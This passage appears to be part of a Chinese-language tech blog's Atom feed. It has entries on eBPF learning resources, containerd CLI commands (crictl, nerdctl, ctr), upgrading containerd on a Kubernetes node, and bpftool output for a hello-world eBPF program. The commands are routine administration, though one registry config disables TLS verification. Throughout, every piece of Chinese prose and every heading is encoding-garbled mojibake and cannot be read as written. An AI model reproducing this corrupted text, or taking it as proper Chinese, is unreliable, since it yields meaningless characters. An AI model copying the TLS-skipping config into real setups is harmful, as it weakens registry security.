    <content type="html"><![CDATA[<p><a href="https://www.bolipi.com/%EF%BC%8CeBPF%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99%E6%AD%A3%E5%9C%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD">https://www.bolipi.com/ï¼ŒeBPFå­¦ä¹ ç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­</a><br><a href="https://github.com/xdp-project/xdp-tutorial">https://github.com/xdp-project/xdp-tutorial</a> è¿™ä¸ªä¸Šé¢èµ„æ–™å’Œä¾‹å­å¾ˆå¤š<br><a href="https://www.cnxct.com/ebpf-slide-pdf-share">https://www.cnxct.com/ebpf-slide-pdf-share</a> è¿™ä¸ªåšä¸»æ•´ç†çš„æŒºå¥½</p><p>æ­£åœ¨çœ‹å†…æ ¸ä¹‹æ—…ç¤¾åŒºCCFç¼–ç¨‹å¤ä»¤è¥å­¦ç”Ÿçš„æ–‡æ¡£å’Œä»£ç ï¼Œå¾ˆé€‚åˆå…¥é—¨<a href="https://gitee.com/linuxkerneltravel/lmp/tree/develop/eBPF_Supermarket/CPU_Subsystem">https://gitee.com/linuxkerneltravel/lmp/tree/develop/eBPF_Supermarket/CPU_Subsystem</a></p><p><a href="https://github.com/eunomia-bpf/bpf-developer-tutorial">https://github.com/eunomia-bpf/bpf-developer-tutorial</a></p><p>ã€ebpfç½‘ç»œåŠ é€Ÿç›¸å…³èµ„æ–™ã€‘</p><ul><li><input disabled="" type="checkbox"> åˆ©ç”¨Â ebpfÂ sockmap&#x2F;redirectionÂ æå‡Â socketÂ æ€§èƒ½ï¼ˆ2020ï¼‰ <a href="https://cloud.tencent.com/developer/article/1793155">https://cloud.tencent.com/developer/article/1793155</a></li><li><input disabled="" type="checkbox"> å›¾è§£eBPFÂ socketÂ levelÂ é‡å®šå‘çš„å†…æ ¸å®ç°ç»†èŠ‚   <a href="https://cloud.tencent.com/developer/article/2245006">https://cloud.tencent.com/developer/article/2245006</a>  </li><li><input disabled="" type="checkbox"> å›¾è§£Linuxç½‘ç»œåŒ…æ¥æ”¶è¿‡ç¨‹   <a href="https://zhuanlan.zhihu.com/p/256428917">https://zhuanlan.zhihu.com/p/256428917</a></li><li><input disabled="" type="checkbox"> å†…åŠŸä¿®ç‚¼   <a href="https://github.com/yanfeizhang/coder-kung-fu">https://github.com/yanfeizhang/coder-kung-fu</a></li><li><input disabled="" type="checkbox"> ebpf ã€Šebpfä¹‹å·…ã€‹ ç¬¬10ç«  ç½‘ç»œ</li></ul><p>ã€åŒäº‹æ¨èã€‘</p><ul><li><input disabled="" type="checkbox"> ebpf  github handbook  <a href="https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md">https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ebpfã€‘å­¦ä¹ èµ„æ–™æ±‡æ€»</title>
    <link href="/2023/02/15/ebpf/unsupported/%E3%80%90ebpf%E3%80%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/"/>
    <url>/2023/02/15/ebpf/unsupported/%E3%80%90ebpf%E3%80%91%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.bolipi.com/%EF%BC%8CeBPF%E5%AD%A6%E4%B9%A0%E7%BD%91%E7%AB%99%E6%AD%A3%E5%9C%A8%E5%BB%BA%E8%AE%BE%E4%B8%AD">https://www.bolipi.com/ï¼ŒeBPFå­¦ä¹ ç½‘ç«™æ­£åœ¨å»ºè®¾ä¸­</a><br><a href="https://github.com/xdp-project/xdp-tutorial">https://github.com/xdp-project/xdp-tutorial</a> è¿™ä¸ªä¸Šé¢èµ„æ–™å’Œä¾‹å­å¾ˆå¤š<br><a href="https://www.cnxct.com/ebpf-slide-pdf-share">https://www.cnxct.com/ebpf-slide-pdf-share</a> è¿™ä¸ªåšä¸»æ•´ç†çš„æŒºå¥½</p><p>æ­£åœ¨çœ‹å†…æ ¸ä¹‹æ—…ç¤¾åŒºCCFç¼–ç¨‹å¤ä»¤è¥å­¦ç”Ÿçš„æ–‡æ¡£å’Œä»£ç ï¼Œå¾ˆé€‚åˆå…¥é—¨<a href="https://gitee.com/linuxkerneltravel/lmp/tree/develop/eBPF_Supermarket/CPU_Subsystem">https://gitee.com/linuxkerneltravel/lmp/tree/develop/eBPF_Supermarket/CPU_Subsystem</a></p><p><a href="https://github.com/eunomia-bpf/bpf-developer-tutorial">https://github.com/eunomia-bpf/bpf-developer-tutorial</a></p><p>ã€ebpfç½‘ç»œåŠ é€Ÿç›¸å…³èµ„æ–™ã€‘</p><ul><li><input disabled="" type="checkbox"> åˆ©ç”¨Â ebpfÂ sockmap&#x2F;redirectionÂ æå‡Â socketÂ æ€§èƒ½ï¼ˆ2020ï¼‰ <a href="https://cloud.tencent.com/developer/article/1793155">https://cloud.tencent.com/developer/article/1793155</a></li><li><input disabled="" type="checkbox"> å›¾è§£eBPFÂ socketÂ levelÂ é‡å®šå‘çš„å†…æ ¸å®ç°ç»†èŠ‚   <a href="https://cloud.tencent.com/developer/article/2245006">https://cloud.tencent.com/developer/article/2245006</a>  </li><li><input disabled="" type="checkbox"> å›¾è§£Linuxç½‘ç»œåŒ…æ¥æ”¶è¿‡ç¨‹   <a href="https://zhuanlan.zhihu.com/p/256428917">https://zhuanlan.zhihu.com/p/256428917</a></li><li><input disabled="" type="checkbox"> å†…åŠŸä¿®ç‚¼   <a href="https://github.com/yanfeizhang/coder-kung-fu">https://github.com/yanfeizhang/coder-kung-fu</a></li><li><input disabled="" type="checkbox"> ebpf ã€Šebpfä¹‹å·…ã€‹ ç¬¬10ç«  ç½‘ç»œ</li></ul><p>ã€åŒäº‹æ¨èã€‘</p><ul><li><input disabled="" type="checkbox"> ebpf  github handbook  <a href="https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md">https://github.com/iovisor/bcc/blob/master/docs/tutorial_bcc_python_developer.md</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€goè¯­è¨€ç³»åˆ—ã€‘ç”¨goå†™ä¸€ä¸ªprometheus exporter</title>
    <link href="/2023/02/08/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E7%94%A8go%E5%86%99%E4%B8%80%E4%B8%AAprometheus%20exporter/"/>
    <url>/2023/02/08/go/%E3%80%90go%E8%AF%AD%E8%A8%80%E7%B3%BB%E5%88%97%E3%80%91%E7%94%A8go%E5%86%99%E4%B8%80%E4%B8%AAprometheus%20exporter/</url>
    
    <content type="html"><![CDATA[<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.51cto.com/luoguoling/5145886">ç”¨goå†™ä¸€ä¸ªprometheus exporter</a></p>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘vmwareä¸­å®‰è£…windowsè™šæ‹Ÿæœº</title>
    <link href="/2023/02/08/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91vmware%E4%B8%AD%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <url>/2023/02/08/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91vmware%E4%B8%AD%E5%AE%89%E8%A3%85windows%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‹è½½windowsé•œåƒ"><a href="#ä¸‹è½½windowsé•œåƒ" class="headerlink" title="ä¸‹è½½windowsé•œåƒ"></a>ä¸‹è½½windowsé•œåƒ</h2><p><a href="https://msdn.itellyou.cn/?lang=zh-cn">msdn</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230208094440.png" alt="image.png"></p><p>æ‰“å¼€è¿…é›·è½¯ä»¶ï¼Œä¼šè‡ªåŠ¨å¤åˆ¶é“¾æ¥è¿›è¡Œä¸‹è½½</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p><a href="https://blog.51cto.com/u_14289664/5133054">VMware Workstation Proè™šæ‹Ÿæœºå®‰è£…Windows 10 ç³»ç»Ÿ</a></p><p>åŸºæœ¬æŒ‰ç…§è¿™ä¸ªæ¥çš„ï¼Œåªæ˜¯è™šæ‹Ÿç£ç›˜é‚£å—é€‰çš„æ˜¯â€œæ‹†åˆ†æˆå¤šä¸ªæ–‡ä»¶â€</p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€containerdã€‘(202302)crictlã€nerdctlå‘½ä»¤</title>
    <link href="/2023/02/06/k8s/%E3%80%90containerd%E3%80%91(202302)crictl%E3%80%81nerdctl%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/02/06/k8s/%E3%80%90containerd%E3%80%91(202302)crictl%E3%80%81nerdctl%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crictl pods <span class="hljs-comment"># list pods - compare with kubectl get pods  </span><br>$ crictl inspectp <span class="hljs-comment"># inspect a pod (different from crictl inspect)  </span><br>$ crictl info <span class="hljs-comment"># view CRI runtime info  </span><br>$ crictl stats <span class="hljs-comment"># does everything look normal?  </span><br>$ crictl --debug stopp <span class="hljs-comment"># [sic] stop a pod and print debug logs (useful if a pod is stuck terminating)</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">åŠŸèƒ½\ç»„ä»¶</th><th align="left">docker</th><th align="left">crictl</th><th align="left">nerdctl</th><th align="left">ctr</th></tr></thead><tbody><tr><td align="left"></td><td align="left"></td><td align="left">æŸä¸ªä¸»æœºå®‰è£…äº† k8s åï¼Œå‘½ä»¤è¡Œæ‰ä¼šæœ‰ crictl å‘½ä»¤</td><td align="left"></td><td align="left">ctr æ˜¯è·Ÿ k8s æ— å…³çš„ï¼Œä¸»æœºå®‰è£…äº† containerd æœåŠ¡åå°±å¯ä»¥æ“ä½œ ctr å‘½ä»¤</td></tr><tr><td align="left"></td><td align="left"></td><td align="left">crictlæ“ä½œçš„å‡åœ¨k8s.ioå‘½åç©ºé—´</td><td align="left"></td><td align="left">ctrå®¢æˆ·ç«¯ä¸»è¦åŒºåˆ†äº†3ä¸ªå‘½åç©ºé—´ï¼Œåˆ†åˆ«æ˜¯k8s.ioã€mobyå’Œdefault</td></tr><tr><td align="left">æŸ¥çœ‹é•œåƒ</td><td align="left"></td><td align="left">crictl images</td><td align="left"></td><td align="left">ctr image ls</td></tr><tr><td align="left">æŸ¥çœ‹k8sçš„é•œåƒ</td><td align="left"></td><td align="left">crictl images list</td><td align="left">nerdctl images â€“namespace k8s.io<br>  nerdctl -n k8s.io images</td><td align="left">ctr -n&#x3D;k8s.io image list</td></tr><tr><td align="left">æ‹‰å–é•œåƒ</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left">ctr i pull â€“user admin:password â€“skip-verify &lt;YOUR REGISTRY&gt;&#x2F;app&#x2F;web1:latest</td></tr><tr><td align="left">åˆ é™¤é•œåƒ</td><td align="left">docker rmi</td><td align="left">crictl rmi</td><td align="left"></td><td align="left">ctr image rm</td></tr><tr><td align="left">åˆ—å‡ºæ‰€æœ‰å®¹å™¨</td><td align="left"></td><td align="left"></td><td align="left">nerdctl ps</td><td align="left"></td></tr><tr><td align="left">è·å–å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯</td><td align="left"></td><td align="left"></td><td align="left">nerdctl inspect xxx</td><td align="left"></td></tr><tr><td align="left">è·å–å®¹å™¨æ—¥å¿—</td><td align="left"></td><td align="left"></td><td align="left">nerdctl logs -f xxx</td><td align="left"></td></tr><tr><td align="left">åœæ­¢å®¹å™¨</td><td align="left"></td><td align="left"></td><td align="left">nerdctl stop xxx</td><td align="left"></td></tr><tr><td align="left">åˆ é™¤å®¹å™¨</td><td align="left"></td><td align="left"></td><td align="left">nerdctl rm xxx</td><td align="left"></td></tr><tr><td align="left">test</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><h2 id="crictl"><a href="#crictl" class="headerlink" title="crictl"></a>crictl</h2><p><code>/etc/containerd/config.toml</code>é…ç½®æ–‡ä»¶ä¸­çš„å†…å®¹ä»…ä¼šå¯¹crictlç”Ÿæ•ˆã€‚</p><p>åœ¨&#x2F;etc&#x2F;containerd&#x2F;config.toml æ–‡ä»¶ä¸­æ·»åŠ éœ€è¦åŠ é€Ÿçš„é•œåƒä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.mirrors.<span class="hljs-string">&quot;k8s.gcr.io&quot;</span>]<br> endpoint = [<span class="hljs-string">&quot;https://registry.aliyuncs.com/k8sxio&quot;</span>]<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>registry.mirrors.&quot;xxx&quot;</code>è¡¨ç¤ºéœ€è¦é…ç½® mirror çš„é•œåƒä»“åº“åŸé•œåƒä»“åº“ï¼Œ<code>endpoint</code>è¡¨ç¤ºæä¾› mirror çš„é•œåƒåŠ é€ŸæœåŠ¡ã€‚</p><h3 id="é•œåƒéªŒè¯"><a href="#é•œåƒéªŒè¯" class="headerlink" title="é•œåƒéªŒè¯"></a>é•œåƒéªŒè¯</h3><h4 id="tlséªŒè¯"><a href="#tlséªŒè¯" class="headerlink" title="tlséªŒè¯"></a>tlséªŒè¯</h4><p>è·³è¿‡tlséªŒè¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.configs.<span class="hljs-string">&quot;&lt;YOUR REGISTRY&gt;&quot;</span>.tls]<br>  insecure_skip_verify = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h4 id="ç”¨æˆ·éªŒè¯"><a href="#ç”¨æˆ·éªŒè¯" class="headerlink" title="ç”¨æˆ·éªŒè¯"></a>ç”¨æˆ·éªŒè¯</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.configs.<span class="hljs-string">&quot;&lt;YOUR REGISTRY&gt;&quot;</span>.auth]<br>  username = <span class="hljs-string">&quot;&lt;YOUR USERNAME&gt;&quot;</span><br>  password = <span class="hljs-string">&#x27;&lt;USERNAME PASSWORD&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>ä½œè€…ï¼šæ©˜å­åŸºå› <br>é“¾æ¥ï¼š<a href="https://www.jianshu.com/p/07a2b4b74d63">https://www.jianshu.com/p/07a2b4b74d63</a><br>æ¥æºï¼šç®€ä¹¦<br>è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p><p><a href="https://www.qikqiak.com/k8strain2/containerd/nerdctl/"># Containerd é«˜çº§å‘½ä»¤è¡Œå·¥å…· nerdctl</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹æœ¬æœºcontainerdåŠ è½½çš„æ’ä»¶</span><br>ctr plugin <span class="hljs-built_in">ls</span> <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@cdp-10-191-193-5 ~]<span class="hljs-comment"># cd /run/containerd</span><br>[root@cdp-10-191-193-5 containerd]<span class="hljs-comment"># ll</span><br>æ€»ç”¨é‡ 0<br>srw-rw---- 1 root root     0 6æœˆ  24 11:43 containerd.sock<br>srw-rw---- 1 root root     0 6æœˆ  24 11:43 containerd.sock.ttrpc<br>drwxr-xr-x 4 root root    80 9æœˆ  19 2023 io.containerd.grpc.v1.cri<br>drwx--x--x 2 root root    40 9æœˆ  11 2023 io.containerd.runtime.v1.linux<br>drwx--x--x 3 root root    60 9æœˆ  19 2023 io.containerd.runtime.v2.task<br>drwx------ 3 root root    60 9æœˆ  19 2023 runc <span class="hljs-comment"># å®¹å™¨çš„çŠ¶æ€</span><br>drw------- 2 root root 46300 6æœˆ  25 22:31 s  <span class="hljs-comment"># containerdä¸shimé€šä¿¡çš„sockeråœ°å€</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202302) å‡çº§ç”Ÿäº§ç¯å¢ƒçš„containerdç‰ˆæœ¬</title>
    <link href="/2023/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202302)%20%E5%8D%87%E7%BA%A7%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E7%9A%84containerd%E7%89%88%E6%9C%AC/"/>
    <url>/2023/02/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202302)%20%E5%8D%87%E7%BA%A7%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E7%9A%84containerd%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>1.é©±é€pod</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">kubectl cordon node2</span><br><span class="hljs-comment">kubectl drain node2</span> <span class="hljs-literal">--</span><span class="hljs-comment">ignore</span><span class="hljs-literal">-</span><span class="hljs-comment">daemonsets</span> <span class="hljs-literal">--</span><span class="hljs-comment">delete</span><span class="hljs-literal">-</span><span class="hljs-comment">emptydir</span><span class="hljs-literal">-</span><span class="hljs-comment">data</span> <span class="hljs-literal">--</span><span class="hljs-comment">force</span><br><br></code></pre></td></tr></table></figure><p>2.æ›¿æ¢containerdçš„äºŒè¿›åˆ¶ï¼Œé‡å¯containerd</p><p>3.åˆ é™¤containerdçš„æ•°æ®ç›®å½•ï¼Œé‡å¯containerd</p><p>4.æ¢å¤node</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">kubectl</span> uncordon node2<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">éšæ—¶ç”¨ä¸‹é¢å‘½ä»¤è¿›è¡Œæµ‹è¯•ï¼š<br>crictl pods<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>4</title>
    <link href="/2023/01/29/ebpf/unsupported/04/"/>
    <url>/2023/01/29/ebpf/unsupported/04/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#### 04èŠ‚</span><br><span class="hljs-comment">###### bpftoolï¼Œç”¨å®ƒå¯ä»¥æŸ¥çœ‹ eBPF ç¨‹åºçš„è¿è¡ŒçŠ¶æ€</span><br><span class="hljs-comment"># æŸ¥è¯¢ç³»ç»Ÿä¸­æ­£åœ¨è¿è¡Œçš„ eBPF ç¨‹åº</span><br>sudo bpftool prog list  <br><span class="hljs-comment"># å¯¼å‡ºè¿™ä¸ª eBPF ç¨‹åºçš„æŒ‡ä»¤</span><br>sudo bpftool prog dump xlated <span class="hljs-built_in">id</span> 89<br><br>sudo bpftool prog dump jited <span class="hljs-built_in">id</span> 89<br><br><br><span class="hljs-comment"># è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨ -ebpfè¡¨ç¤ºåªè·Ÿè¸ªbpfç³»ç»Ÿè°ƒç”¨</span><br>strace -v -f -ebpf ./hello-opennat.py<br><br>strace -v -f ./hello-opennat.py<br><br><br>ç”¨é«˜çº§è¯­è¨€å¼€å‘çš„ eBPF ç¨‹åºï¼Œéœ€è¦é¦–å…ˆç¼–è¯‘ä¸º BPF å­—èŠ‚ç ï¼ˆå³ BPF æŒ‡ä»¤ï¼‰ï¼Œç„¶åå€ŸåŠ© bpf ç³»ç»Ÿè°ƒç”¨åŠ è½½åˆ°å†…æ ¸ä¸­ï¼Œæœ€åå†é€šè¿‡æ€§èƒ½ç›‘æ§ç­‰æ¥å£ï¼Œä¸å…·ä½“çš„å†…æ ¸äº‹ä»¶è¿›è¡Œç»‘å®šã€‚è¿™æ ·ï¼Œå†…æ ¸çš„æ€§èƒ½ç›‘æ§æ¨¡å—æ‰ä¼šåœ¨å†…æ ¸äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œæˆ‘ä»¬å¼€å‘çš„ eBPF ç¨‹åºã€‚<br><br><br></code></pre></td></tr></table></figure><h2 id="ç¯å¢ƒä¿¡æ¯"><a href="#ç¯å¢ƒä¿¡æ¯" class="headerlink" title="ç¯å¢ƒä¿¡æ¯"></a>ç¯å¢ƒä¿¡æ¯</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 5.15.0-58-generic <span class="hljs-comment">#64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># uname -r</span><br>5.15.0-58-generic<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 22.04.1 LTS<br>Release:        22.04<br>Codename:       jammy<br></code></pre></td></tr></table></figure><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><h3 id="BPF-æŒ‡ä»¤æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ"><a href="#BPF-æŒ‡ä»¤æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ" class="headerlink" title="BPF æŒ‡ä»¤æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ"></a>BPF æŒ‡ä»¤æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog list</span><br>...<br>170: kprobe  name hello_world  tag 38dd440716c4900f  gpl<br>        loaded_at 2023-01-29T22:53:07+0800  uid 0<br>        xlated 104B  jited 74B  memlock 4096B<br>        btf_id 103<br><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog dump xlated id 170</span><br>int hello_world(void * ctx):<br>; int hello_world(void *ctx)<br>   0: (b7) r1 = 33<br>; (&#123; char _fmt[] = <span class="hljs-string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, sizeof(_fmt)); &#125;);  // æœ€å¸¸ç”¨çš„ BPF è¾…åŠ©å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¾“å‡ºä¸€æ®µå­—ç¬¦ä¸²ã€‚ä¸è¿‡ï¼Œç”±äº eBPF è¿è¡Œåœ¨å†…æ ¸ä¸­ï¼Œå®ƒçš„è¾“å‡ºå¹¶ä¸æ˜¯é€šå¸¸çš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œè€Œæ˜¯å†…æ ¸è°ƒè¯•æ–‡ä»¶ /sys/kernel/debug/tracing/trace_pipe<br>   1: (6b) *(u16 *)(r10 -4) = r1<br>   2: (b7) r1 = 1684828783<br>   3: (63) *(u32 *)(r10 -8) = r1<br>   4: (18) r1 = 0x57202c6f6c6c6548<br>   6: (7b) *(u64 *)(r10 -16) = r1<br>   7: (bf) r1 = r10<br>;<br>   8: (07) r1 += -16<br>; (&#123; char _fmt[] = <span class="hljs-string">&quot;Hello, World!&quot;</span>; bpf_trace_printk_(_fmt, sizeof(_fmt)); &#125;);  // æœ€å¸¸ç”¨çš„ BPF è¾…åŠ©å‡½æ•°ï¼Œå®ƒçš„ä½œç”¨æ˜¯è¾“å‡ºä¸€æ®µå­—ç¬¦ä¸²ã€‚ä¸è¿‡ï¼Œç”±äº eBPF è¿è¡Œåœ¨å†…æ ¸ä¸­ï¼Œå®ƒçš„è¾“å‡ºå¹¶ä¸æ˜¯é€šå¸¸çš„æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ï¼Œè€Œæ˜¯å†…æ ¸è°ƒè¯•æ–‡ä»¶ /sys/kernel/debug/tracing/trace_pipe<br>   9: (b7) r2 = 14<br>  10: (85) call bpf_trace_printk<span class="hljs-comment">#-65424</span><br>; <span class="hljs-built_in">return</span> 0;<br>  11: (b7) r0 = 0<br>  12: (95) <span class="hljs-built_in">exit</span><br><br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool prog dump jited id 170</span><br>Error: No libbfd support<br><br>[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo bpftool version -p</span><br>&#123;<br>    <span class="hljs-string">&quot;version&quot;</span>: <span class="hljs-string">&quot;5.15.74&quot;</span>,<br>    <span class="hljs-string">&quot;features&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;libbfd&quot;</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-string">&quot;skeletons&quot;</span>: <span class="hljs-literal">false</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="eBPF-ç¨‹åºæ˜¯ä»€ä¹ˆæ—¶å€™æ‰§è¡Œçš„ï¼Ÿ"><a href="#eBPF-ç¨‹åºæ˜¯ä»€ä¹ˆæ—¶å€™æ‰§è¡Œçš„ï¼Ÿ" class="headerlink" title="eBPF ç¨‹åºæ˜¯ä»€ä¹ˆæ—¶å€™æ‰§è¡Œçš„ï¼Ÿ"></a>eBPF ç¨‹åºæ˜¯ä»€ä¹ˆæ—¶å€™æ‰§è¡Œçš„ï¼Ÿ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 